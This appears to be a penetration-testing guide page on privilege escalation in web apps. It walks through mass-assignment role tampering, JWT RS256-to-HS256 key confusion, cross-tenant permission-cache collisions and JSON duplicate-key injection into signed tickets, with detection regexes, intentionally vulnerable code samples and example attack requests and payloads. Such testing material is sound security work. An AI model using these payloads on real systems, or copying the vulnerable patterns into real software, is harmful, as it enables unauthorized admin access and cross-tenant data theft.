# Privilege Escalation

## Check List

## Methodology

### Black Box

#### Manipulation of Account Attributes

{% stepper %}
{% step %}
Inspect JavaScript files in the target website to identify parameters like `isEmployee` or `isCorporate`,`admin` and ..., then use Burp Suite to locate them in a GET request to `/customer/{{ID}}`
{% endstep %}

{% step %}
Attempt to modify the parameters by using Burp Suite’s “`Match and Replace`” feature to change false to true in the GET request, but note if it fails
{% endstep %}

{% step %}
Send an OPTIONS request to `/customer/{{ID}}` with Burp Suite to check supported methods, confirming the endpoint accepts a PATCH request
{% endstep %}

{% step %}
Send a PATCH request to `/customer/{{ID}}` with modified parameters (`{"isEmployee": true}`) to escalate privileges, intercepting and altering the request body
{% endstep %}

{% step %}
Return to the website and navigate to the checkout endpoint, adding excessive products to verify if the escalated employee status grants an unauthorized discount
{% endstep %}

{% step %}
Test ID or related parameters (`user_id, customer_id`) on other customer-related endpoints like `/user/{{ID}}`, `/profile/{{ID}}`, `/account/{{ID}}`, or `/customer/update`, as these often handle privilege settings and may share similar vulnerabilities
{% endstep %}
{% endstepper %}

***

#### Registration Feature

{% stepper %}
{% step %}
Enter the registration form and capture the registration process using burp Suite and check if it is a POST or GET request
{% endstep %}

{% step %}
Find the role parameter in the POST request body, which is initially set to {"role": "User"} or may be in numeric form like `{"role": "5"}`, and to try to increase the privilege, change it to `{"role": "Admin"}` or to `{"role": "1"}`
{% endstep %}

{% step %}
Send the modified request and check the account status after registration; if it grants admin access, it confirms the vulnerability
{% endstep %}
{% endstepper %}

***

#### Setpermission API\`s&#x20;

{% stepper %}
{% step %}
Log in to the target site and use [Recon](https://unk9vvn.gitbook.io/penetration-testing/web/reconnaissance/enumerate-applications) to obtain the API paths and API documentation
{% endstep %}

{% step %}
Then look for APIs that perform an access level process
{% endstep %}

{% step %}
Then create two accounts, one with Chrome and one with Firefox
{% endstep %}

{% step %}
Then check whether the access level can be changed by replacing the victim's ID, which is a Chrome account, with the hacker's ID, which is a Firefox account. If it changes, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Privilege Escalation via JWT Algorithm/Key-Confusion (RS256 to HS256 Self-Signed Admin Token)

{% stepper %}
{% step %}
Map the entire target system using Burp Suite

{% tabs %}
{% tab title="C#" %}
```regexp
(Request\.Cookies\[\s*"role")|(Request\.Headers\[\s*"X-Role")|(Request\.Headers\[\s*"X-User-Role")
```
{% endtab %}

{% tab title="Java" %}
```regexp
(getHeader\(\s*"X-Role")|(getHeader\(\s*"X-User-Role")|(getCookies\(\).*"role")
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$_COOKIE\[\s*['"]role['"]\])|(\$_SERVER\[\s*['"]HTTP_X_ROLE['"]\])|(\$_REQUEST\[\s*['"]role['"]\])
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(req\.cookies\.role)|(req\.headers\[['"]x-role['"]\])|(req\.headers\[['"]x-user-role['"]\])
```


{% endtab %}
{% endtabs %}



{% tabs %}
{% tab title="C#" %}
```c#
public class RoleAuthorizationFilter : IAuthorizationFilter
{
    public void OnAuthorization(AuthorizationFilterContext context)
    {
        var role = context.HttpContext.Request.Cookies["role"]; // [1]

        if (role != "admin") // [2]
        {
            context.Result = new ForbiddenResult();
        }
    }
}

[HttpGet("admin/users")]
[TypeFilter(typeof(RoleAuthorizationFilter))]
public IActionResult ListUsers()
{
    return Ok(_userService.GetAll()); // [3]
}
```
{% endtab %}

{% tab title="Java" %}
```java
public class RoleAuthorizationFilter implements Filter {
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest httpReq = (HttpServletRequest) req;
        String role = getCookieValue(httpReq, "role"); // [1]

        if (!"admin".equals(role)) { // [2]
            ((HttpServletResponse) res).sendError(403);
            return;
        }
        chain.doFilter(req, res);
    }
}

@GetMapping("/admin/users")
public ResponseEntity<?> listUsers() {
    return ResponseEntity.ok(userService.getAll()); // [3]
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function requireAdmin() {
    $role = $_COOKIE['role'] ?? null; // [1]

    if ($role !== 'admin') { // [2]
        http_response_code(403);
        exit;
    }
}

function listUsers() {
    requireAdmin();
    echo json_encode(UserService::getAll()); // [3]
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function requireAdmin(req, res, next) {
  const role = req.cookies.role; // [1]

  if (role !== 'admin') { // [2]
    return res.status(403).end();
  }
  next();
}

app.get('/admin/users', requireAdmin, (req, res) => {
  res.json(userService.getAll()); // [3]
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
Identify how the application issues and verifies session tokens. Intercept a normal login response and decode the JWT header (`alg`, `kid`) and payload, looking for a privilege-bearing claim such as `role`, `scope`, or `perm`
{% endstep %}

{% step %}
Determine whether the application exposes its own verification key material — check for a JWKS endpoint (`/.well-known/jwks.json`), a `/certs` endpoint, or a public key/certificate shipped inside a mobile or desktop client — and retrieve it
{% endstep %}

{% step %}
In the decompiled server code, locate the JWT verification function and determine whether it pins the expected algorithm server-side before verifying, or whether it branches its verification logic on the `alg` value taken directly from the attacker-controlled token header
{% endstep %}

{% step %}
Check whether the exact same key object/variable is passed into both the asymmetric (RSA/ECDSA) verification branch and the symmetric `(HMAC)` verification branch — if the abstraction is generic enough to accept "a key" without distinguishing a `PublicKey` object from a raw secret byte array, the `RSA` public key's encoded bytes can be reused as the `HMAC` secret
{% endstep %}

{% step %}
If both conditions hold, build a forged token with header `alg: HS256`, a payload containing the victim's identity claim and an elevated role/scope claim, and sign it with HMAC-SHA256 using the exact byte representation of the retrieved public key (matched precisely to how the server reads it: DER bytes from `getEncoded()`, or the raw PEM text, depending on what the server's key-loading code actually passes into the verifier)

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(jwt\.Header\.Alg)|(SymmetricSecurityKey\(.*Rsa\.Export)|(IssuerSigningKey\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(getHeader\(\)\.getAlgorithm\(\))|(new MACVerifier\(.*getEncoded\(\))|(new RSASSAVerifier\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$header\['alg'\])|(new Key\(\$key,\s*['"]HS256['"])|(new Key\(\$key,\s*['"]RS256['"])
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(decoded\.header\.alg)|(jwt\.verify\(token,\s*key,\s*\{\s*algorithms:\s*\['HS256'\])|(jwt\.verify\(token,\s*key,\s*\{\s*algorithms:\s*\['RS256'\])
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
jwt\.Header\.Alg|SymmetricSecurityKey\(.*Rsa\.Export|IssuerSigningKey\s*=
```
{% endtab %}

{% tab title="Java" %}
```regexp
getHeader\(\)\.getAlgorithm\(\)|new MACVerifier\(.*getEncoded\(\)|new RSASSAVerifier\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$header\['alg'\]|new Key\(\$key,\s*['"]HS256['"]|new Key\(\$key,\s*['"]RS256['"]
```
{% endtab %}

{% tab title="Node.js" %}
```regex
decoded\.header\.alg|jwt\.verify\(token,\s*key,\s*\{\s*algorithms:\s*\['HS256'\]|jwt\.verify\(token,\s*key,\s*\{\s*algorithms:\s*\['RS256'\]
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```c#
public ClaimsPrincipal VerifyToken(string token)
{
    var handler = new JwtSecurityTokenHandler();
    var jwt = handler.ReadJwtToken(token);
    var alg = jwt.Header.Alg; // [1] algorithm taken from the attacker-controlled header

    SecurityKey key = this.signingKey; // [2] one key object reused across both branches

    var validationParams = new TokenValidationParameters
    {
        IssuerSigningKey = alg == "HS256"
            ? new SymmetricSecurityKey(((RsaSecurityKey)key).Rsa.ExportSubjectPublicKeyInfo()) // [3] RSA public key bytes reused as the HMAC secret
            : key,
        ValidateIssuer = false,
        ValidateAudience = false
    };

    return handler.ValidateToken(token, validationParams, out _);
}
```
{% endtab %}

{% tab title="Java" %}
```java
public Claims verifyToken(String token) throws Exception {
    SignedJWT jwt = SignedJWT.parse(token);
    String alg = jwt.getHeader().getAlgorithm().getName(); // [1] algorithm taken from the attacker-controlled header

    JWSVerifier verifier;
    if ("HS256".equals(alg)) {
        verifier = new MACVerifier(this.signingKey.getEncoded()); // [2] RSA public key bytes reused as the HMAC secret
    } else {
        verifier = new RSASSAVerifier((RSAPublicKey) this.signingKey); // [3] same key object on the asymmetric branch
    }

    if (!jwt.verify(verifier)) {
        throw new SecurityException("Invalid signature");
    }

    return parseClaims(jwt);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function verifyToken($token) {
    $headerB64 = explode('.', $token)[0];
    $header = json_decode(base64_decode($headerB64), true);
    $alg = $header['alg']; // [1] algorithm taken from the attacker-controlled header

    $key = $this->signingKey; // PEM string holding the RSA public key

    if ($alg === 'HS256') {
        return JWT::decode($token, new Key($key, 'HS256')); // [2] PEM string reused as the HMAC secret
    }

    return JWT::decode($token, new Key($key, 'RS256')); // [3] same PEM string on the asymmetric branch
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function verifyToken(token) {
  const decoded = jwt.decode(token, { complete: true });
  const alg = decoded.header.alg; // [1] algorithm taken from the attacker-controlled header

  const key = this.signingKey; // PEM string holding the RSA public key

  if (alg === 'HS256') {
    return jwt.verify(token, key, { algorithms: ['HS256'] }); // [2] PEM string reused as the HMAC secret
  }

  return jwt.verify(token, key, { algorithms: ['RS256'] }); // [3] same PEM string on the asymmetric branch
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Note the markers: `[1]` the algorithm used to validate the signature is decided by data the attacker fully controls, `[2]` the symmetric branch derives its `HMAC` secret from the exact same key object the asymmetric branch treats as a public key, `[3]` confirming that whatever bytes the server reads as "the public key" are the same bytes a forged HS256 signature must be computed with
{% endstep %}

{% step %}
Retrieve the public key/certificate via the JWKS or certs endpoint, then build a forged token: set the header to `{"alg":"HS256","typ":"JWT"}`, set the payload to the victim's `sub` plus an elevated role claim, and compute `HMAC-SHA256(base64url(header) + "." + base64url(payload), <public-key-bytes>)`, base64url-encoding the result as the third segment

```http
GET /.well-known/jwks.json HTTP/1.1
Host: target.tld
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"keys":[{"kty":"RSA","kid":"primary-2026","n":"u1SU1Lf...","e":"AQAB"}]}
```

```
GET /api/admin/users HTTP/1.1
Host: target.tld
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9.k3F1lW0v...
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

[{"id":1,"username":"alice"},{"id":2,"username":"bob"}]    
```
{% endstep %}

{% step %}
If a token signed with `HS256`, using only the server's already-public `RSA` key material as the secret, is accepted and grants the elevated role, the verification layer never actually pinned which algorithm — and therefore which trust boundary — it was supposed to enforce, confirming full privilege escalation with no prior credentials of any kind
{% endstep %}
{% endstepper %}

***

#### Privilege Escalation via Permission-Cache Key Collision Across Tenant Boundary

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
Identify whether the application pre-resolves permission sets from the database on every request, or whether a caching layer (in-process map, or an external cache such as Redis/Memcached) sits in front of the authorization decision to avoid repeating expensive role/permission joins
{% endstep %}

{% step %}
In the decompiled code, locate the function that builds the cache key for a resolved permission set, and identify every component that key is built from — pay close attention to whether the tenant/organization identifier is actually part of the key, or whether the key is built only from a value that is not guaranteed to be globally unique, such as a human-readable role _name_ rather than its tenant-scoped database primary key
{% endstep %}

{% step %}
Determine whether role names are free-form, tenant-scoped strings that can collide across tenants — for example, every newly provisioned tenant automatically receives a default role literally named `org-admin`, and any tenant owner is free to create or rename a custom role to that exact same string
{% endstep %}

{% step %}
Identify which tenant's resolved permission set is most likely to populate the shared cache first in real traffic (the busiest tenant, or one carrying broad legacy/grandfathered grants), and confirm the cache has no tenant-aware partitioning, invalidation, or short enough TTL to prevent reuse across tenants within a normal request window
{% endstep %}

{% step %}
From a low-privilege account inside a separate, attacker-controlled tenant, create or rename a role to exactly match the colliding role name identified in step 6, assign it to your own test account, then immediately exercise an authorization check and observe whether the resulting permission set is broader than what your own tenant's role actually grants in the database

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(\$"perm:\{role)|(_cache\.TryGetValue\(cacheKey)|(ResolvePermissions)
```
{% endtab %}

{% tab title="Java" %}
```regexp
("perm:" \+ role)|(permissionCache\.get\(cacheKey)|(resolvePermissions)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
("perm:\$role")|(\$this->cache->get\(\$cacheKey)|(resolvePermissions)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(\`perm:\$\{role)|(cache\.get\(cacheKey)|(resolvePermissions)
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
\$"perm:\{role|_cache\.TryGetValue\(cacheKey|ResolvePermissions
```
{% endtab %}

{% tab title="Java" %}
```regexp
"perm:" \+ role|permissionCache\.get\(cacheKey|resolvePermissions
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"perm:\$role"|\$this->cache->get\(\$cacheKey|resolvePermissions
```
{% endtab %}

{% tab title="Node.js" %}
```regex
\`perm:\$\{role|cache\.get\(cacheKey|resolvePermissions
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```c#
public HashSet<string> ResolvePermissions(string tenantId, string userId, string roleName)
{
    var cacheKey = $"perm:{roleName}"; // [1] tenant/org id is never part of the cache key

    if (_cache.TryGetValue(cacheKey, out HashSet<string> cached))
    {
        return cached; // [2] returns whatever tenant populated this key first
    }

    var resolved = _permissionRepository.ResolveForRole(tenantId, roleName); // [3] correctly tenant-scoped lookup, but only on a cache miss
    _cache.Set(cacheKey, resolved, TimeSpan.FromMinutes(30));
    return resolved;
}
```
{% endtab %}

{% tab title="Java" %}
```java
public Set<String> resolvePermissions(String tenantId, String userId, String roleName) {
    String cacheKey = "perm:" + roleName; // [1] tenant/org id is never part of the cache key

    Set<String> cached = permissionCache.get(cacheKey);
    if (cached != null) {
        return cached; // [2] returns whatever tenant populated this key first
    }

    Set<String> resolved = permissionRepository.resolveForRole(tenantId, roleName); // [3] correctly tenant-scoped lookup, but only on a cache miss
    permissionCache.put(cacheKey, resolved, Duration.ofMinutes(30));
    return resolved;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function resolvePermissions($tenantId, $userId, $roleName) {
    $cacheKey = "perm:$roleName"; // [1] tenant/org id is never part of the cache key

    $cached = $this->cache->get($cacheKey);
    if ($cached !== null) {
        return $cached; // [2] returns whatever tenant populated this key first
    }

    $resolved = PermissionRepository::resolveForRole($tenantId, $roleName); // [3] correctly tenant-scoped lookup, but only on a cache miss
    $this->cache->set($cacheKey, $resolved, 1800);
    return $resolved;
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
async function resolvePermissions(tenantId, userId, roleName) {
  const cacheKey = `perm:${roleName}`; // [1] tenant/org id is never part of the cache key

  const cached = await cache  .get(cacheKey);
  if (cached) {
    return cached; // [2] returns whatever tenant populated this key first
  }

  const resolved = await permissionRepository.resolveForRole(tenantId, roleName); // [3] correctly tenant-scoped lookup, but only on a cache miss
  await cache.set(cacheKey, resolved, 1800);
  return resolved;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Note the markers: `[1]` the cache key collapses every tenant down to a single shared namespace keyed only by a free-text role name, `[2]` a cache hit returns the previously cached value with no re-check of which tenant it actually belongs to, `[3]` the only place a tenant-scoped lookup actually happens is on a miss — meaning correctness depends entirely on which tenant happens to ask first
{% endstep %}

{% step %}
Trigger the legitimate, high-privilege tenant's permission resolution first (or simply wait for normal production traffic to do so), then immediately create/rename a colliding role in your own low-privilege tenant and exercise a sensitive endpoint

```http
POST /tenants/tenant-b/roles HTTP/1.1
Host: target.tld
Authorization: Bearer <tenant-b-owner-token>
Content-Type: application/json

{"name":"org-admin","permissions":["read:own-data"]}
```

```http
GET /tenants/tenant-b/billing/export HTTP/1.1
Host: target.tld
Authorization: Bearer <tenant-b-low-priv-token-holding-org-admin-role>
```

```
HTTP/1.1 200 OK
Content-Type: application/json

{"export_url":"https://target.tld/exports/tenant-a-billing-2026-06.csv"}
```
{% endstep %}

{% step %}
If the response exposes a capability or another tenant's resource that is absent from your own tenant's actual `org-admin` role record in the database, the permission-cache key collision is confirmed: privilege was inherited from whichever tenant populated the shared cache entry first, not from your own tenant's real grant
{% endstep %}
{% endstepper %}

***

#### Privilege Escalation via JSON Duplicate-Key Injection in a String-Templated, Signed Session Ticket

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
Identify a feature that issues a signed ticket/token outside the main login flow — a device-linking ticket, an account-recovery ticket, an impersonation ticket, an SSO assertion — and check whether it embeds at least one user-influenced free-text field (display name, note, device label, redirect hint) alongside a privilege-bearing field such as `role`, `scope`, or `aud`
{% endstep %}

{% step %}
In the decompiled code, determine whether the ticket's JSON body is built with a proper object serializer (which automatically escapes special characters inside string values), or via manual string concatenation/templating that interpolates raw field values directly into a hand-written JSON literal
{% endstep %}

{% step %}
If string templating is used, check what sanitization, if any, is applied to the user-controlled field before interpolation — note whether it filters characters relevant to HTML/script injection (`<`, `>`) while leaving JSON-structural characters (`"`, `\`) completely untouched
{% endstep %}

{% step %}
Confirm that the signing function computes its MAC/signature over the final, fully-built string exactly as produced — meaning the signer has no semantic awareness of the JSON structure and will faithfully cover anything the templating step assembled, including any structure the user managed to inject
{% endstep %}

{% step %}
Separately, locate the function that reads claims back out of a verified ticket at request time and identify which JSON parser it uses to do so — confirm that, like most real-world JSON parsers, it silently resolves a duplicate key to a single value (commonly whichever occurrence appears last) instead of rejecting the document as malformed
{% endstep %}

{% step %}
Craft the free-text field so that, once interpolated into the template, it closes the field it was meant to populate early, injects a second, complete `"role":"<elevated-role>"` key/value pair, and reopens a throwaway field so the document remains syntactically valid end-to-end

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regexp
(\"sub\\\":\\\"\" \+)|(HmacSha256\(json)|(IssueLinkingTicket)|(ReadTicket)
```
{% endtab %}

{% tab title="Java" %}
```regexp
("\\\"sub\\\":\\\"" \+)|(hmacSha256\(json)|(issueLinkingTicket)|(readTicket)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
('\{"sub":"' \.)|(hash_hmac\(\s*['"]sha256['"]\s*,\s*\$json)|(issueLinkingTicket)|(readTicket)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(`\{"sub":"\$\{)|(hmacSha256\(json)|(issueLinkingTicket)|(readTicket)
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regexp
\"sub\\\":\\\"\" \+|HmacSha256\(json|IssueLinkingTicket|ReadTicket
```
{% endtab %}

{% tab title="Java" %}
```regexp
"\\\"sub\\\":\\\"" \+|hmacSha256\(json|issueLinkingTicket|readTicket
```
{% endtab %}

{% tab title="PHP" %}
```regexp
'\{"sub":"' \.|hash_hmac\(\s*['"]sha256['"]\s*,\s*\$json|issueLinkingTicket|readTicket
```
{% endtab %}

{% tab title="Node.js" %}
```regex
`\{"sub":"\$\{|hmacSha256\(json|issueLinkingTicket|readTicket
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```c#
public string IssueLinkingTicket(string userId, string role, string note)
{
    var json = "{\"sub\":\"" + userId + "\","
             + "\"role\":\"" + role + "\","
             + "\"note\":\"" + note + "\"}"; // [1] manual string templating, no JSON escaping on `note`

    var signature = HmacSha256(json, this.signingSecret); // [2] signs the final raw string exactly as built
    return Convert.ToBase64String(Encoding.UTF8.GetBytes(json)) + "." + signature;
}

public Claims ReadTicket(string ticket)
{
    var parts = ticket.Split('.');
    var json = Encoding.UTF8.GetString(Convert.FromBase64String(parts[0]));

    if (HmacSha256(json, this.signingSecret) != parts[1])
        throw new SecurityException("Invalid signature");

    var parsed = JsonDocument.Parse(json); // [3] a duplicate key resolves silently, no error raised
    return new Claims(parsed.RootElement.GetProperty("sub").GetString(),
                       parsed.RootElement.GetProperty("role").GetString());
}
```
{% endtab %}

{% tab title="Java" %}
```java
public String issueLinkingTicket(String userId, String role, String note) {
    String json = "{\"sub\":\"" + userId + "\","
                + "\"role\":\"" + role + "\","
                + "\"note\":\"" + note + "\"}"; // [1] manual string templating, no JSON escaping on `note`

    String signature = hmacSha256(json, this.signingSecret); // [2] signs the final raw string exactly as built
    return Base64.getUrlEncoder().encodeToString(json.getBytes()) + "." + signature;
}

public Claims readTicket(String ticket) throws Exception {
    String[] parts = ticket.split("\\.");
    String json = new String(Base64.getUrlDecoder().decode(parts[0]));

    if (!hmacSha256(json, this.signingSecret).equals(parts[1])) {
        throw new SecurityException("Invalid signature");
    }

    JsonNode parsed = objectMapper.readTree(json); // [3] a duplicate key resolves silently, no error raised
    return new Claims(parsed.get("sub").asText(), parsed.get("role").asText());
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function issueLinkingTicket($userId, $role, $note) {
    $json = '{"sub":"' . $userId . '",'
          . '"role":"' . $role . '",'
          . '"note":"' . $note . '"}'; // [1] manual string templating, no JSON escaping on `note`

    $signature = hash_hmac('sha256', $json, $this->signingSecret); // [2] signs the final raw string exactly as built
    return base64_encode($json) . '.' . $signature;
}

function readTicket($ticket) {
    [$payloadB64, $signature] = explode('.', $ticket);
    $json = base64_decode($payloadB64);

    if (!hash_equals(hash_hmac('sha256', $json, $this->signingSecret), $signature)) {
        throw new Exception('Invalid signature');
    }

    $parsed = json_decode($json, true); // [3] a duplicate key resolves silently, no error raised
    return ['sub' => $parsed['sub'], 'role' => $parsed['role']];
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function issueLinkingTicket(userId, role, note) {
  const json = `{"sub":"${userId}","role":"${role}","note":"${note}"}`; // [1] manual string templating, no JSON escaping on `note`

  const signature = hmacSha256(json, this.signingSecret); // [2] signs the final raw string exactly as built
  return Buffer.from(json).toString('base64') + '.' + signature;
}

function readTicket(ticket) {
  const [payloadB64, signature] = ticket.split('.');
  const json = Buffer.from(payloadB64, 'base64').toString('utf8');

  if (hmacSha256(json, this.signingSecret) !== signature) {
    throw new Error('Invalid signature');
  }

  const parsed = JSON.parse(json); // [3] a duplicate key resolves silently, no error raised
  return { sub: parsed.sub, role: parsed.role };
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Note the markers: `[1]` the only field outside the developer's control is `note`, interpolated with zero JSON-structural escaping, `[2]` whatever the templating step produces — legitimate or injected — is exactly what gets signed, so a valid signature says nothing about how many `role` keys ended up in the document, `[3]` the claims reader silently resolves the duplicate without ever surfacing that the document was malformed
{% endstep %}

{% step %}
Set the free-text field to a value that closes the current string early, injects a second `role` key, and reopens a disposable field

```json
","role":"admin","x":"
```
{% endstep %}

{% step %}
Save that value into the field the ticket-issuing endpoint embeds, then trigger ticket issuance — the resulting payload, once decoded, reads `{"sub":"alice","role":"user","note":"","role":"admin","x":""}`, which is syntactically valid JSON containing two `role` keys

```http
PATCH /account/profile HTTP/1.1
Host: target.tld
Authorization: Bearer <low-priv-token>
Content-Type: application/json

{"note":"\",\"role\":\"admin\",\"x\":\""}
```

```http
POST /account/link-device HTTP/1.1
Host: target.tld
Authorization: Bearer <low-priv-token>
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"ticket":"eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwibm90ZSI6IiIsInJvbGUiOiJhZG1pbiIsIngiOiIifQ==.f3a9c1b27e..."}
```
{% endstep %}

{% step %}
Redeem the ticket at the privileged consumption endpoint and confirm which `role` value wins

```http
POST /account/link-device/confirm HTTP/1.1
Host: target.tld
Content-Type: application/json

{"ticket":"eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwibm90ZSI6IiIsInJvbGUiOiJhZG1pbiIsIngiOiIifQ==.f3a9c1b27e..."}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"session":"d41d8cd98f00...","role":"admin"}
```
{% endstep %}

{% step %}
If the resulting session reflects the injected `role` value instead of the account's real role on file, the signature validated correctly while the elevated claim was never something the issuing logic intended to grant — confirming privilege escalation through a structural injection that fully survives signature verification
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
